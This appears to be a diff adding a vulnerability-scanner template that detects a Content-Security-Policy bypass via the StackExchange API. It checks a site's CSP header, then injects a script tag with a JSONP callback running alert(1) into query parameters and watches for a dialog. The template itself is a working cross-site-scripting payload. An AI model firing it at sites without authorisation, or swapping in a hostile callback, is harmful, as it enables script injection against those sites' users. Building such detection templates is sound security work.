@@ -1,0 +1,55 @@
+id: stackexchange-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - StackExchange API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,stackexchange-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "stackexchange.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: stackexchange_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.stackexchange.com/2.2/me?callback=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "stackexchange_api_csp_xss == true"
+# digest: 4a0a00473045022100c71ae9565794c2754513ecacb871a17503f88b4de60181eb7bf01ff827664d64022025048fdb58404e7db1fe71648cbd914b7cd165c5353ac4a608e02932c3e44fd3:922c64590222798bb761d5b6d8e72950
